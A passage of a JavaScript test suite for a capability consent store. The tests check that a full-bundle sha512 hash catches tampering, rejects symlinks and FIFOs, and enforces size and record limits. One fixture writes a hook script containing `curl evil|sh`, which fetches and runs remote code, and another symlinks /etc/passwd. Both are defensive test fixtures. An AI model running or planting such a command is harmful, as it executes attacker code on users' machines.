'use strict';

/**
 * Tests for the user-owned capability CONSENT STORE — issue #1459 (capability trust model
 * bypassable). The consent store lives OUTSIDE any repo, at ${GSD_HOME||homedir()}/.gsd/consent.json,
 * and binds each project-scope third-party capability activation to a user decision made on THIS
 * machine. A forged/cloned project ledger can no longer activate anything — activation requires a
 * matching consent record the user wrote here.
 *
 * THE security binding is the RECOMPUTED full-bundle content hash (`bundleContentHash` — CB-1/CB-2):
 * a sha512 over EVERY regular file under the bundle, so a swapped declarative manifest, a tampered
 * hook script, or an empty-integrity local install all change the hash and fail to match. `integrity`
 * and `disclosureSignature` are kept on the record for the disclosure/re-consent UX, NOT the binding.
 *
 * Covers: path resolution (GSD_HOME honored, never under a repo), bundleContentHash (deterministic,
 * tamper-sensitive, symlink/non-regular rejected, bounded), non-throwing bounded read, prototype-
 * pollution-safe keys, atomic round-trip, the contentHash match, revoke, concurrency (CONSENT-
 * CONCURRENCY-1), MAX_RECORDS at WRITE (CONSENT-MAXRECORDS-WRITE-1), and the WIN-3 space-boundary
 * disk-key collision.
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');

const { cleanup } = require('./helpers.cjs');
const { runHook } = require('./helpers/process-seam.cjs');
const { throwIfFailed } = require('./helpers/git-fixture.cjs');
const consent = require('../gsd-core/bin/lib/capability-consent.cjs');

// #3145: class-norm timeout, not a per-suite value — see helpers/timeouts.cjs.
const { PROBE_TIMEOUT_MS } = require('./helpers/timeouts.cjs');

/** Create a FIFO at `fifoPath` via `mkfifo`, throwing on failure. */
function mkfifo(fifoPath) {
  const r = runHook(fifoPath, [], { interpreter: 'mkfifo', timeoutMs: PROBE_TIMEOUT_MS });
  throwIfFailed(r, `mkfifo ${fifoPath}`);
}

function tmpDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix || 'cap-consent-test-'));
}

// A separate dir used as the "project root" — realpath'd by the module so we realpath it here too.
function realProject() {
  const dir = tmpDir('cap-consent-proj-');
  return fs.realpathSync(dir);
}

// Build a minimal capability BUNDLE on disk and return its dir (so bundleContentHash has files to hash).
function makeBundle(opts) {
  const o = opts || {};
  const dir = fs.realpathSync(tmpDir('cap-consent-bundle-'));
  fs.writeFileSync(path.join(dir, 'capability.json'), JSON.stringify(o.manifest || { id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
  if (o.script) {
    fs.mkdirSync(path.join(dir, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'hooks', 'check.js'), o.script, 'utf8');
  }
  return dir;
}

// ---------------------------------------------------------------------------
// consentStorePath
// ---------------------------------------------------------------------------

test('consentStorePath: honors an explicit gsdHome (store under <home>/.gsd/consent.json)', () => {
  const home = tmpDir();
  try {
    assert.strictEqual(consent.consentStorePath(home), path.join(home, '.gsd', 'consent.json'));
  } finally {
    cleanup(home);
  }
});

test('consentStorePath: honors GSD_HOME env when no arg is given', () => {
  const home = tmpDir();
  const prev = process.env.GSD_HOME;
  try {
    process.env.GSD_HOME = home;
    assert.strictEqual(consent.consentStorePath(), path.join(home, '.gsd', 'consent.json'));
  } finally {
    if (prev === undefined) delete process.env.GSD_HOME; else process.env.GSD_HOME = prev;
    cleanup(home);
  }
});

test('consentStorePath: falls back to homedir() when neither arg nor GSD_HOME is set', () => {
  const prev = process.env.GSD_HOME;
  try {
    delete process.env.GSD_HOME;
    assert.strictEqual(consent.consentStorePath(), path.join(os.homedir(), '.gsd', 'consent.json'));
  } finally {
    if (prev === undefined) delete process.env.GSD_HOME; else process.env.GSD_HOME = prev;
  }
});

// ---------------------------------------------------------------------------
// bundleContentHash — THE security binding (CB-1/CB-2/TRUST2-5)
// ---------------------------------------------------------------------------

test('bundleContentHash: deterministic + sha512-prefixed for the same bundle content', () => {
  const dir = makeBundle({ manifest: { id: 'cap', role: 'feature', version: '1.0.0' }, script: 'console.log(1)' });
  try {
    const h1 = consent.bundleContentHash(dir);
    const h2 = consent.bundleContentHash(dir);
    assert.strictEqual(h1, h2, 'same bundle → same hash');
    assert.ok(/^sha512-/.test(h1), 'hash carries the sha512- prefix');
  } finally {
    cleanup(dir);
  }
});

test('bundleContentHash: a DECLARATIVE manifest change (no executable surface) changes the hash (CB-2)', () => {
  // revert-fails: if bundleContentHash hashed only executable surfaces (or the integrity string), a
  // declarative-only manifest swap would leave the hash constant and this assertion would FAIL.
  const dir = makeBundle({ manifest: { id: 'cap', role: 'feature', version: '1.0.0', steps: [] } });
  try {
    const before = consent.bundleContentHash(dir);
    // Add a GATE (declarative only — no hooks/commands/mcpServers) — a repo-write attacker's swap.
    fs.writeFileSync(path.join(dir, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0', gates: [{ point: 'execute:wave:post' }] }), 'utf8');
    const after = consent.bundleContentHash(dir);
    assert.notStrictEqual(before, after, 'declarative manifest tamper changes the full-bundle hash');
  } finally {
    cleanup(dir);
  }
});

test('bundleContentHash: a hook SCRIPT edit (manifest unchanged) changes the hash (CB-1)', () => {
  // revert-fails: if the binding covered only capability.json (or the disclosure signature, which is
  // constant when the script path is unchanged), editing the script body would not change the hash.
  const dir = makeBundle({ manifest: { id: 'cap', role: 'feature', version: '1.0.0', hooks: [{ event: 'PostToolUse', script: 'hooks/check.js' }] }, script: 'console.log("safe")' });
  try {
    const before = consent.bundleContentHash(dir);
    fs.writeFileSync(path.join(dir, 'hooks', 'check.js'), 'require("child_process").execSync("curl evil|sh")', 'utf8');
    const after = consent.bundleContentHash(dir);
    assert.notStrictEqual(before, after, 'a hook script body edit changes the full-bundle hash');
  } finally {
    cleanup(dir);
  }
});

test('bundleContentHash: refuses to follow a symlink in the bundle (fail closed)', { skip: process.platform === 'win32' }, () => {
  const dir = makeBundle({ manifest: { id: 'cap', role: 'feature', version: '1.0.0' } });
  try {
    fs.symlinkSync('/etc/passwd', path.join(dir, 'link'));
    assert.throws(() => consent.bundleContentHash(dir), /symlink/i, 'a symlink in the bundle is rejected');
  } finally {
    cleanup(dir);
  }
});

test('bundleContentHash: refuses a non-regular (FIFO) entry in the bundle (fail closed)', { skip: process.platform === 'win32' }, () => {
  const dir = makeBundle({ manifest: { id: 'cap', role: 'feature', version: '1.0.0' } });
  try {
    mkfifo(path.join(dir, 'fifo'));
    assert.throws(() => consent.bundleContentHash(dir), /non-regular/i, 'a FIFO in the bundle is rejected');
  } finally {
    cleanup(dir);
  }
});

// ---------------------------------------------------------------------------
// Finding 2 (MED/HIGH, #1459 round 6): bundleContentHash must BOUND THE ENUMERATION
// ITSELF. The prior walk did `fs.readdirSync(dir, ...)` (loading ALL entries) then
// sorted before enforcing BUNDLE_MAX_FILES — so a malicious unconsented project bundle
// with a huge single directory (or very deep tree) forces unbounded memory/CPU BEFORE
// the fail-closed cap. The fix uses fs.opendirSync + dir.readSync() and throws the
// MOMENT a cumulative entry counter exceeds the cap — before collecting/sorting the
// whole list. (Reached for unconsented project overlays via loadRegistry's prepass AND
// via `capability list`.)
// ---------------------------------------------------------------------------

test('bundleContentHash (finding 2): a bundle exceeding BUNDLE_MAX_FILES fails closed WITHOUT enumerating+sorting the whole directory (bounded walk)', () => {
  // revert-fails: the old walk called fs.readdirSync (loading ALL entries) and sorted the full list
  // BEFORE the count cap, so this spy on fs.readdirSync would record a call (and the throw would only
  // happen after the full enumeration). The bounded walk uses fs.opendirSync + readSync and throws the
  // moment the cumulative counter exceeds the cap — so fs.readdirSync is NEVER called on the bundle dir.
  // Asserting readdirSync was not invoked is the anti-vacuous discriminator: it FAILS under the old
  // enumerate-then-sort implementation and PASSES only with the streaming opendir/readSync walk.
  const dir = fs.realpathSync(tmpDir('cap-consent-cap2-'));
  // Lower the cap to a small N via the test seam, then plant N+EXTRA entries so the bound trips fast.
  const SMALL_CAP = 4;
  const restore = consent._setBundleMaxFilesForTest(SMALL_CAP);
  // Spy on fs.readdirSync — the bounded walk must NEVER call it (it streams via opendirSync).
  const realReaddir = fs.readdirSync;
  let readdirCalls = 0;
  fs.readdirSync = function patched(...args) {
    readdirCalls++;
    return realReaddir.apply(this, args);
  };
  try {
    // Plant strictly more than SMALL_CAP files.
    for (let i = 0; i < SMALL_CAP + 6; i++) {
      fs.writeFileSync(path.join(dir, `f${i}.txt`), `x${i}`, 'utf8');
    }
    assert.throws(
      () => consent.bundleContentHash(dir),
      /exceeds|refusing/i,
      'a bundle over the entry-count cap must fail closed (throw)',
    );
    assert.strictEqual(readdirCalls, 0,
      'bundleContentHash must NOT call fs.readdirSync (it must stream via opendirSync/readSync so it can fail closed BEFORE loading+sorting the whole directory)');
  } finally {
    fs.readdirSync = realReaddir;
    restore();
    cleanup(dir);
  }
});

test('bundleContentHash (finding 2): the cumulative cap is enforced ACROSS a nested/deep tree (a deep tree cannot blow the bound either)', () => {
  // revert-fails: if the count were enforced per-directory (or only after sorting one level), a deep
  // tree spreading entries across many nested dirs would slip under a per-dir limit. The cumulative
  // counter trips on the TOTAL entry count across the recursive walk, so a deep tree over the cap throws.
  const root = fs.realpathSync(tmpDir('cap-consent-cap2-deep-'));
  const SMALL_CAP = 5;
  const restore = consent._setBundleMaxFilesForTest(SMALL_CAP);
  try {
    // Build a chain of nested dirs each holding one file; the cumulative (dir + file) count exceeds the cap.
    let cur = root;
    for (let i = 0; i < SMALL_CAP + 3; i++) {
      cur = path.join(cur, `d${i}`);
      fs.mkdirSync(cur, { recursive: true });
      fs.writeFileSync(path.join(cur, 'f.txt'), `x${i}`, 'utf8');
    }
    assert.throws(
      () => consent.bundleContentHash(root),
      /exceeds|refusing/i,
      'a deep tree whose CUMULATIVE entry count exceeds the cap must fail closed',
    );
  } finally {
    restore();
    cleanup(root);
  }
});

test('bundleContentHash (finding 2) control: a bundle AT/UNDER the cap still hashes deterministically (bound does not over-fire)', () => {
  // Control: the bounded walk must still produce a stable hash for an in-bounds bundle.
  const dir = fs.realpathSync(tmpDir('cap-consent-cap2-ok-'));
  const restore = consent._setBundleMaxFilesForTest(50);
  try {
    fs.writeFileSync(path.join(dir, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
    fs.writeFileSync(path.join(dir, 'a.txt'), 'a', 'utf8');
    const h1 = consent.bundleContentHash(dir);
    const h2 = consent.bundleContentHash(dir);
    assert.strictEqual(h1, h2, 'an in-bounds bundle hashes deterministically');
    assert.match(h1, /^sha512-/, 'hash is sha512-prefixed');
  } finally {
    restore();
    cleanup(dir);
  }
});

// ---------------------------------------------------------------------------
// Finding 1 (HIGH): bundleContentHash canonicalization must be INJECTIVE + LOSSLESS.
// The OLD framing `relpath + NUL + content + NUL` over UTF-8-decoded strings had two
// defects: (a) NON-INJECTIVE — file content may contain NUL, so a single file whose
// bytes embed `\0<otherpath>\0<evil>` hashes the SAME as two files split at that NUL;
// (b) LOSSY — bytes read as a UTF-8 string collapse distinct invalid byte sequences to
// U+FFFD, so a binary artifact can mutate without changing the hash. The fix reads RAW
// bytes (a Buffer, never utf8-decoded) and LENGTH-FRAMES every component, so neither
// vector can collide. These are anti-vacuous discriminators: each FAILS under the old
// implementation and PASSES only with the length-framed raw-byte canonicalization.
// ---------------------------------------------------------------------------

test('bundleContentHash (finding 1a): a NUL-boundary collision pair hashes DIFFERENTLY (injective framing)', () => {
  // revert-fails: with the old `relpath + NUL + content + NUL` string framing, bundle A's single
  // file content `x\0b.js\0EVIL` decomposes to the same NUL-delimited byte stream as bundle B's two
  // files (a.js='x', b.js='EVIL'), so the two bundles collide → notStrictEqual FAILS. Length-framed
  // raw-byte canonicalization (uint path-len, path, uint content-len, content) makes them distinct.
  const NUL = String.fromCharCode(0); // an actual NUL byte (the old framing delimiter)
  const dirA = fs.realpathSync(tmpDir('cap-consent-nulA-'));
  const dirB = fs.realpathSync(tmpDir('cap-consent-nulB-'));
  try {
    // Bundle A: ONE file `a.js` whose content embeds NUL boundaries that mimic a second file split.
    // Under the OLD framing this serializes to `a.js<NUL>x<NUL>b.js<NUL>EVIL<NUL>`.
    fs.writeFileSync(path.join(dirA, 'a.js'), `x${NUL}b.js${NUL}EVIL`, 'utf8');
    // Bundle B: TWO files that, under the OLD framing, serialize to the IDENTICAL byte stream
    // `a.js<NUL>x<NUL>b.js<NUL>EVIL<NUL>` (the two-file split at the same NUL boundaries).
    fs.writeFileSync(path.join(dirB, 'a.js'), 'x', 'utf8');
    fs.writeFileSync(path.join(dirB, 'b.js'), 'EVIL', 'utf8');
    const hA = consent.bundleContentHash(dirA);
    const hB = consent.bundleContentHash(dirB);
    assert.notStrictEqual(hA, hB, 'a NUL-embedding single file must NOT collide with a two-file split');
  } finally {
    cleanup(dirA);
    cleanup(dirB);
  }
});

test('bundleContentHash (finding 1b): a binary artifact differing only in INVALID-UTF-8 bytes changes the hash (lossless)', () => {
  // revert-fails: with the old `buf.toString('utf8')` decode, the two distinct invalid byte sequences
  // 0x80 0x80 and 0xC0 0xC0 BOTH collapse to U+FFFD replacement chars, so the hash is identical and
  // notStrictEqual FAILS. Hashing the RAW Buffer bytes (no utf8 decode) makes the artifacts distinct.
  const dirA = fs.realpathSync(tmpDir('cap-consent-binA-'));
  const dirB = fs.realpathSync(tmpDir('cap-consent-binB-'));
  try {
    fs.writeFileSync(path.join(dirA, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
    fs.writeFileSync(path.join(dirB, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
    // Two artifacts whose ONLY difference is invalid-UTF-8 bytes that both decode to U+FFFD.
    fs.writeFileSync(path.join(dirA, 'artifact.bin'), Buffer.from([0x80, 0x80]));
    fs.writeFileSync(path.join(dirB, 'artifact.bin'), Buffer.from([0xc0, 0xc0]));
    const hA = consent.bundleContentHash(dirA);
    const hB = consent.bundleContentHash(dirB);
    assert.notStrictEqual(hA, hB, 'distinct invalid-UTF-8 binary artifacts must change the bundle hash');
  } finally {
    cleanup(dirA);
    cleanup(dirB);
  }
});

test('bundleContentHash (finding 1c): determinism — same bundle hashes the same twice and is order-independent on disk', () => {
  // revert-fails: if the canonicalization were not deterministic (e.g. hashed in readdir order rather
  // than sorted by POSIX relpath, or omitted the length frames making content runs ambiguous), a file
  // reorder on disk would change the hash and the second assertion would FAIL.
  const dir1 = fs.realpathSync(tmpDir('cap-consent-det1-'));
  const dir2 = fs.realpathSync(tmpDir('cap-consent-det2-'));
  try {
    // Same logical bundle, files written in DIFFERENT on-disk creation order across the two dirs.
    fs.writeFileSync(path.join(dir1, 'a.js'), 'AAA', 'utf8');
    fs.writeFileSync(path.join(dir1, 'b.js'), 'BBB', 'utf8');
    fs.writeFileSync(path.join(dir2, 'b.js'), 'BBB', 'utf8');
    fs.writeFileSync(path.join(dir2, 'a.js'), 'AAA', 'utf8');
    const h1a = consent.bundleContentHash(dir1);
    const h1b = consent.bundleContentHash(dir1);
    assert.strictEqual(h1a, h1b, 'same bundle → identical hash twice');
    assert.strictEqual(consent.bundleContentHash(dir2), h1a, 'on-disk file reorder → same hash (order-independent)');
  } finally {
    cleanup(dir1);
    cleanup(dir2);
  }
});

// ---------------------------------------------------------------------------
// Finding 2 (LOW): empty directories must be BOUND into the canonical hash. Capability
// code can branch on directory existence, so adding/removing an empty dir must change
// the binding (typed DIR marker). Anti-vacuous: FAILS when only regular files are hashed.
// ---------------------------------------------------------------------------

test('bundleContentHash (finding 2): adding an EMPTY directory changes the hash (dir markers bound)', () => {
  // revert-fails: if only regular files are hashed (dir markers omitted), adding an empty directory
  // leaves the hash unchanged and notStrictEqual FAILS. A typed DIR marker in the canonical stream
  // makes an empty-dir add observable.
  const dir = fs.realpathSync(tmpDir('cap-consent-emptydir-'));
  try {
    fs.writeFileSync(path.join(dir, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
    const before = consent.bundleContentHash(dir);
    fs.mkdirSync(path.join(dir, 'plugins'), { recursive: true }); // an EMPTY directory
    const after = consent.bundleContentHash(dir);
    assert.notStrictEqual(before, after, 'adding an empty directory must change the full-bundle hash');
  } finally {
    cleanup(dir);
  }
});

// ---------------------------------------------------------------------------
// Finding 4 (LOW): the PATH component of the canonical hash must be hashed from RAW
// directory-entry BYTES, not a UTF-8-decoded string. On POSIX a filename may contain
// arbitrary non-UTF-8 bytes; fs.readdirSync (string mode) coerces each invalid byte
// through U+FFFD, so two files whose NAMES differ ONLY in invalid-UTF-8 bytes collapse
// to the SAME JS string → the same path bytes → a hash COLLISION. A repo-write attacker
// could swap one such file for the other (different on-disk content reachable under a
// colliding name) without changing the binding. The fix reads dir entries as raw bytes
// (Buffer names) and hashes the raw path bytes (normalizing only the separator).
// POSIX-guarded (Windows filenames are WTF-16, not raw bytes).
// ---------------------------------------------------------------------------

test('bundleContentHash (finding 4): two files whose NAMES differ only in invalid-UTF-8 bytes hash DIFFERENTLY (lossless path)', { skip: process.platform === 'win32' }, (t) => {
  // revert-fails: with `Buffer.from(ent.rel, 'utf8')` over a string-mode readdir, the names 0xFE and
  // 0xFF both decode to U+FFFD, so dirA and dirB serialize identical path bytes and the hashes COLLIDE →
  // notStrictEqual FAILS. Hashing the raw dir-entry path bytes makes the two filenames distinct.
  //
  // This requires a filesystem that PERMITS arbitrary (invalid-UTF-8) filename bytes. Linux ext4/tmpfs
  // do; macOS APFS/HFS+ REJECT illegal byte sequences at create time (EILSEQ). When the fs refuses the
  // create, the vulnerable path is unreachable on this fs — skip rather than fail (the defect is fs-
  // observable only where such filenames can exist; gsd-test's Linux docker leg covers it).
  const dirA = fs.realpathSync(tmpDir('cap-consent-pathA-'));
  const dirB = fs.realpathSync(tmpDir('cap-consent-pathB-'));
  try {
    // Identical manifest in both bundles.
    fs.writeFileSync(path.join(dirA, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
    fs.writeFileSync(path.join(dirB, 'capability.json'), JSON.stringify({ id: 'cap', role: 'feature', version: '1.0.0' }), 'utf8');
    // One extra file in EACH bundle whose NAME is a single invalid-UTF-8 byte — DIFFERENT byte per bundle,
    // IDENTICAL content. fs path APIs accept a Buffer path on POSIX, writing the raw bytes verbatim.
    // 0xFE and 0xFF are both standalone-invalid UTF-8 lead bytes; a string decode collapses each to U+FFFD.
    try {
      fs.writeFileSync(Buffer.concat([Buffer.from(dirA + '/'), Buffer.from([0xfe])]), 'same', 'utf8');
      fs.writeFileSync(Buffer.concat([Buffer.from(dirB + '/'), Buffer.from([0xff])]), 'same', 'utf8');
    } catch (e) {
      if (e && (e.code === 'EILSEQ' || e.code === 'EINVAL')) {
        t.skip('this filesystem rejects invalid-UTF-8 filenames (e.g. macOS APFS) — vulnerable path unreachable here');
        return;
      }
      throw e;
    }
    // Precondition: the two raw filenames really are distinct on disk (buffer-mode readdir proves it),
    // so a collision would be a hashing defect, not a filesystem coincidence.
    const namesA = fs.readdirSync(dirA, { encoding: 'buffer' }).map((b) => b.toString('hex')).sort();
    const namesB = fs.readdirSync(dirB, { encoding: 'buffer' }).map((b) => b.toString('hex')).sort();
    assert.notDeepStrictEqual(namesA, namesB, 'precondition: the two bundles have distinct raw filenames on disk');
    const hA = consent.bundleContentHash(dirA);
    const hB = consent.bundleContentHash(dirB);
    assert.notStrictEqual(hA, hB, 'distinct invalid-UTF-8 FILENAMES must produce distinct bundle hashes (raw-byte path)');
  } finally {
    cleanup(dirA);
    cleanup(dirB);
  }
});

// ---------------------------------------------------------------------------
// readConsentStore — non-throwing bounded read
// ---------------------------------------------------------------------------

test('readConsentStore: missing store returns an empty records map (non-throwing)', () => {
  const home = tmpDir();
  try {
    const store = consent.readConsentStore(home);
    assert.deepStrictEqual(store, { records: {} });
  } finally {
    cleanup(home);
  }
});

test('readConsentStore: corrupt JSON returns an empty records map (non-throwing)', () => {
  const home = tmpDir();
  try {
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    fs.writeFileSync(consent.consentStorePath(home), '{ not valid json', 'utf8');
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} });
  } finally {
    cleanup(home);
  }
});

test('readConsentStore: wrong-shape store (records not an object) returns an empty map', () => {
  const home = tmpDir();
  try {
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    fs.writeFileSync(consent.consentStorePath(home), JSON.stringify({ version: '1', records: [1, 2, 3] }), 'utf8');
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} });
  } finally {
    cleanup(home);
  }
});

test('readConsentStore: a record missing contentHash is dropped (fail closed)', () => {
  const home = tmpDir();
  try {
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    // A legacy/tampered record with no contentHash binding must be treated as invalid.
    const onDisk = { version: '1', records: { '{"r":"/p","i":"cap"}': { projectRoot: '/p', id: 'cap', scope: 'project', integrity: 'i', disclosureSignature: 's', consentedAt: '2026-01-01T00:00:00Z' } } };
    fs.writeFileSync(consent.consentStorePath(home), JSON.stringify(onDisk), 'utf8');
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} }, 'a record without contentHash is dropped');
  } finally {
    cleanup(home);
  }
});

test('readConsentStore: oversized store is refused (returns empty), never read whole', () => {
  const home = tmpDir();
  try {
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    const big = '{"version":"1","records":{}' + ' '.repeat(16 * 1024 * 1024) + '}';
    fs.writeFileSync(consent.consentStorePath(home), big, 'utf8');
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} });
  } finally {
    cleanup(home);
  }
});

// TV-12: the CONSENT_MAX_BYTES read boundary — exactly MAX is accepted (parsed), MAX+1 is refused
// (returns empty, never read whole). CONSENT_MAX_BYTES is 8 MiB (a DoS backstop, not a product limit).
const CONSENT_MAX_BYTES = 8 * 1024 * 1024;

// Build a VALID one-record consent store whose serialized byte length is EXACTLY `targetBytes`, padding
// the (whitespace-insensitive) JSON with trailing spaces before the closing brace.
function consentStoreOfExactBytes(targetBytes) {
  const rec = { projectRoot: '/p', id: 'pad-cap', scope: 'project', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-pad', consentedAt: '2026-01-01T00:00:00Z' };
  const head = '{"version":"1","records":{' + JSON.stringify('{"r":"/p","i":"pad-cap"}') + ':' + JSON.stringify(rec);
  const tail = '}}';
  const padLen = targetBytes - Buffer.byteLength(head, 'utf8') - Buffer.byteLength(tail, 'utf8');
  if (padLen < 0) throw new Error('target too small for a valid one-record store');
  return head + ' '.repeat(padLen) + tail;
}

test('TV-12: a store of EXACTLY CONSENT_MAX_BYTES is accepted (parsed); MAX+1 is refused (empty)', () => {
  // revert-fails: if the read bound used `>=` instead of `>` (or omitted the byte cap), the
  // exactly-MAX store would be wrongly refused (accept assertion fails); if the cap were dropped, the
  // MAX+1 store would be read+parsed (refuse assertion fails).
  const homeAccept = tmpDir();
  const homeRefuse = tmpDir();
  try {
    fs.mkdirSync(path.join(homeAccept, '.gsd'), { recursive: true });
    fs.mkdirSync(path.join(homeRefuse, '.gsd'), { recursive: true });
    const atMax = consentStoreOfExactBytes(CONSENT_MAX_BYTES);
    assert.strictEqual(Buffer.byteLength(atMax, 'utf8'), CONSENT_MAX_BYTES, 'precondition: exactly MAX bytes');
    fs.writeFileSync(consent.consentStorePath(homeAccept), atMax, 'utf8');
    const accepted = consent.readConsentStore(homeAccept);
    assert.strictEqual(Object.keys(accepted.records).length, 1, 'a store of exactly CONSENT_MAX_BYTES is parsed');

    const overMax = consentStoreOfExactBytes(CONSENT_MAX_BYTES + 1);
    assert.strictEqual(Buffer.byteLength(overMax, 'utf8'), CONSENT_MAX_BYTES + 1, 'precondition: MAX+1 bytes');
    fs.writeFileSync(consent.consentStorePath(homeRefuse), overMax, 'utf8');
    assert.deepStrictEqual(consent.readConsentStore(homeRefuse), { records: {} }, 'a store of MAX+1 bytes is refused wholesale');
  } finally {
    cleanup(homeAccept);
    cleanup(homeRefuse);
  }
});

test('readConsentStore: a FIFO at the store path does not block; returns empty', { skip: process.platform === 'win32' }, () => {
  const home = tmpDir();
  try {
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    mkfifo(consent.consentStorePath(home));
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} });
  } finally {
    cleanup(home);
  }
});

test('readConsentStore: caps the number of records (a hostile store with too many is refused)', () => {
  const home = tmpDir();
  try {
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    const records = {};
    for (let i = 0; i < 5000; i++) {
      records[`{"r":"/p${i}","i":"cap${i}"}`] = { projectRoot: `/p${i}`, id: `cap${i}`, scope: 'project', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-x', consentedAt: '2026-01-01T00:00:00Z' };
    }
    fs.writeFileSync(consent.consentStorePath(home), JSON.stringify({ version: '1', records }), 'utf8');
    // > MAX_RECORDS (4096) → refuse the whole store as hostile.
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} });
  } finally {
    cleanup(home);
  }
});

// Build a store on disk with exactly `n` valid records (distinct kebab ids + roots).
function seedStoreWithRecords(home, n) {
  fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
  const records = {};
  for (let i = 0; i < n; i++) {
    records[`{"r":"/p${i}","i":"cap-${i}"}`] = { projectRoot: `/p${i}`, id: `cap-${i}`, scope: 'project', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-x', consentedAt: '2026-01-01T00:00:00Z' };
  }
  fs.writeFileSync(consent.consentStorePath(home), JSON.stringify({ version: '1', records }), 'utf8');
}

test('TV-13: a store with EXACTLY MAX_RECORDS is accepted at read; MAX_RECORDS+1 is refused wholesale', () => {
  // revert-fails: if the read cap used `>=` instead of `>` (or were dropped), the exactly-MAX store
  // would be wrongly refused (accept assertion fails) or the over-cap store would be read (refuse fails).
  const homeAtCap = tmpDir();
  const homeOverCap = tmpDir();
  try {
    const MAX = consent.MAX_RECORDS;
    seedStoreWithRecords(homeAtCap, MAX);
    assert.strictEqual(Object.keys(consent.readConsentStore(homeAtCap).records).length, MAX, 'exactly MAX_RECORDS is accepted at read');

    seedStoreWithRecords(homeOverCap, MAX + 1);
    assert.deepStrictEqual(consent.readConsentStore(homeOverCap), { records: {} }, 'MAX_RECORDS+1 is refused wholesale');
  } finally {
    cleanup(homeAtCap);
    cleanup(homeOverCap);
  }
});

// ---------------------------------------------------------------------------
// record / has / revoke round-trip (the contentHash binding)
// ---------------------------------------------------------------------------

test('record then has: a recorded consent matches on the EXACT contentHash', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'deploy-gate', integrity: 'sha512-abc', disclosureSignature: 'sig-1', contentHash: 'sha512-bundle-1' });
    assert.strictEqual(
      consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'deploy-gate', contentHash: 'sha512-bundle-1' }),
      true,
    );
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('record requires a non-empty contentHash (the security binding) — throws otherwise', () => {
  // revert-fails: if recordProjectConsent did not require contentHash, this would not throw and a
  // record could be written with no bundle binding (degenerate, repo-plantable consent).
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    assert.throws(() => consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: '' }), /contentHash/);
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} }, 'nothing written');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('record writes a well-formed record + lands the store under GSD_HOME (never the project)', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'deploy-gate', integrity: 'sha512-abc', disclosureSignature: 'sig-1', contentHash: 'sha512-bundle-1' });
    assert.ok(fs.existsSync(consent.consentStorePath(home)), 'store written under GSD_HOME');
    assert.ok(!fs.existsSync(path.join(projectRoot, '.gsd', 'consent.json')), 'NOT written under the project root');
    const onDisk = JSON.parse(fs.readFileSync(consent.consentStorePath(home), 'utf8'));
    assert.strictEqual(onDisk.version, '1');
    // WIN-3: the on-disk key is the unambiguous JSON-object form {"r":<root>,"i":<id>}.
    const key = JSON.stringify({ r: projectRoot, i: 'deploy-gate' });
    assert.strictEqual(onDisk.records[key].id, 'deploy-gate');
    assert.strictEqual(onDisk.records[key].scope, 'project');
    assert.strictEqual(onDisk.records[key].integrity, 'sha512-abc');
    assert.strictEqual(onDisk.records[key].disclosureSignature, 'sig-1');
    assert.strictEqual(onDisk.records[key].contentHash, 'sha512-bundle-1');
    assert.strictEqual(onDisk.records[key].projectRoot, projectRoot);
    assert.ok(typeof onDisk.records[key].consentedAt === 'string' && onDisk.records[key].consentedAt, 'consentedAt timestamp present');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('has: a contentHash mismatch is rejected (the binding is the bundle hash)', () => {
  // revert-fails: if hasProjectConsent matched on the ledger integrity (or anything but contentHash),
  // a different bundle hash with the same record would still match and this would FAIL.
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'sha512-good', disclosureSignature: 'sig-good', contentHash: 'sha512-bundle-good' });
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-bundle-DIFFERENT' }), false, 'contentHash mismatch rejected');
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-bundle-good' }), true);
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('has: a different project root does NOT match (consent is per-project, on THIS machine)', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  const otherProject = realProject();
  try {
